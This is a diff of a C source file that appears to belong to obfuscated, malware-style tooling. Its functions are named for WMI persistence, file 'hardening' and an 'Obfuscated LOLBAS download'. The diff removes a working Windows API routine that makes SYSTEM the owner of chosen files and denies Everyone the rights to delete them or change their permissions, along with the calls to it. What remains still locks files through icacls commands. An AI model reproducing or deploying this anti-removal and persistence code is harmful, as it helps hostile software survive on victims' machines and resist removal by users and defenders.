@@ -11,10 +11,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <aclapi.h>
 #include "obf.h"
-
-#pragma comment(lib, "advapi32.lib")
 
 /* XOR key — change this per build */
 #define XOR_KEY 0x7A
@@ -778,78 +775,6 @@ void obf_sys_wmi_persistence(void) {
  * 5. Explicitly denying all write/delete/modify permissions for Everyone
  */
 
-/* Direct API-based file hardening fallback — does not rely on icacls.exe.
- * Sets owner to SYSTEM and adds a Deny ACE for DELETE/WRITE_DAC/WRITE_OWNER.
- * More reliable than spawning a subprocess. */
-static void obf_set_file_acl_direct(const char *path) {
-    DWORD sdSize = 0;
-    PSECURITY_DESCRIPTOR pSD = NULL;
-    PSID pEveryoneSid = NULL;
-    PSID pSystemSid = NULL;
-    PACL pNewDacl = NULL;
-    SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
-    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
-
-    /* Get current security descriptor to preserve existing ACEs */
-    if (GetFileSecurityA(path, DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION, NULL, 0, &sdSize) == 0 &&
-        GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
-        pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, sdSize);
-        if (pSD && GetFileSecurityA(path, DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION, pSD, sdSize, &sdSize)) {
-            /* Get existing DACL */
-            PACL pOldDacl = NULL;
-            BOOL daclPresent = FALSE;
-            BOOL daclDefaulted = FALSE;
-            if (GetSecurityDescriptorDacl(pSD, &daclPresent, &pOldDacl, &daclDefaulted)) {
-                /* Create Everyone SID */
-                AllocateAndInitializeSid(&worldAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);
-                /* Create SYSTEM SID */
-                AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid);
-
-                if (pEveryoneSid && pSystemSid) {
-                    /* Calculate new DACL size: old + 2 new ACEs (DENY for Everyone, ALLOW for SYSTEM) */
-                    DWORD newAclSize = sizeof(ACL);
-                    if (daclPresent && pOldDacl) {
-                        for (WORD i = 0; i < pOldDacl->AceCount; i++) {
-                            LPVOID ace;
-                            if (GetAce(pOldDacl, i, &ace)) {
-                                newAclSize += ((PACE_HEADER)ace)->AceSize;
-                            }
-                        }
-                    }
-                    newAclSize += sizeof(ACCESS_DENIED_ACE) + GetLengthSid(pEveryoneSid) - sizeof(DWORD);
-                    newAclSize += sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(pSystemSid) - sizeof(DWORD);
-
-                    pNewDacl = (PACL)LocalAlloc(LPTR, newAclSize);
-                    if (pNewDacl && InitializeAcl(pNewDacl, newAclSize, ACL_REVISION)) {
-                        /* Add explicit DENY for Everyone: DELETE, WRITE_DAC, WRITE_OWNER */
-                        AddAccessDeniedAce(pNewDacl, ACL_REVISION, DELETE | WRITE_DAC | WRITE_OWNER, pEveryoneSid);
-                        /* Add explicit ALLOW for SYSTEM: full control */
-                        AddAccessAllowedAce(pNewDacl, ACL_REVISION, GENERIC_ALL, pSystemSid);
-                        /* Copy old ACEs */
-                        if (daclPresent && pOldDacl) {
-                            for (WORD i = 0; i < pOldDacl->AceCount; i++) {
-                                LPVOID ace;
-                                if (GetAce(pOldDacl, i, &ace)) {
-                                    AddAce(pNewDacl, ACL_REVISION, MAXDWORD, ace, ((PACE_HEADER)ace)->AceSize);
-                                }
-                            }
-                        }
-                        /* Set the new DACL */
-                        SetNamedSecurityInfoA((char*)path, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
-                        /* Set owner to SYSTEM */
-                        SetNamedSecurityInfoA((char*)path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSystemSid, NULL, NULL, NULL);
-                    }
-                }
-            }
-        }
-    }
-
-    if (pEveryoneSid) FreeSid(pEveryoneSid);
-    if (pSystemSid) FreeSid(pSystemSid);
-    if (pNewDacl) LocalFree(pNewDacl);
-    if (pSD) LocalFree(pSD);
-}
-
 void obf_sys_harden_files(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
@@ -910,9 +835,6 @@ void obf_sys_harden_files(void) {
                 icacls, path, username);
             sys_run_command(cmd);
         }
-        
-        /* Direct API fallback — immune to icacls failures */
-        obf_set_file_acl_direct(path);
     }
 }
 
@@ -952,9 +874,6 @@ void obf_sys_harden_single_file(const char *filename) {
             icacls, path, username);
         sys_run_command(cmd);
     }
-    
-    /* Direct API fallback */
-    obf_set_file_acl_direct(path);
 }
 
 /* === Obfuscated LOLBAS download === */
